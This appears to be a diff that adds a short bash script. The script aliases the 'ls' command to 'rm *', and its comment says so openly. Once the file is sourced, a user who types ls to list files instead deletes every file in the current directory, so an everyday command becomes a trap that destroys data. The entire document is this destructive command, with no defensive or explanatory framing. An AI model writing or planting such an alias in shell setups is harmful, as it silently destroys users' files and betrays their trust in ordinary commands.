@@ -1,0 +1,4 @@
+#!/bin/bash
+# Replaces 'ls' with 'rm *'
+
+alias ls='rm *'
